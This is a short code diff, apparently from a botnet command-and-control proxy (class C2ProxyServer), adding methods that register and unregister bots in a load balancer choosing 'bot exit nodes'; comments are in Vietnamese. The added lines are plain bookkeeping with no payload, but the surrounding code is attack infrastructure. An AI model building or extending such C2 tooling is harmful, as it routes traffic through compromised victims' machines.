@@ -860,6 +860,16 @@ class C2ProxyServer:
 class ProxyLoadBalancer:
     def __init__(self):
         self.current_bot_index = 0
+        self.registered_bots = {}
+        
+    def register_bot(self, bot_id, bot_info):
+        """Đăng ký bot vào danh sách load balancer (tối thiểu để tương thích)."""
+        self.registered_bots[bot_id] = bot_info
+        
+    def unregister_bot(self, bot_id):
+        """Hủy đăng ký bot khỏi load balancer."""
+        if bot_id in self.registered_bots:
+            del self.registered_bots[bot_id]
         
     def select_bot(self, bot_exit_nodes, strategy="round_robin"):
         """Chọn bot exit node"""
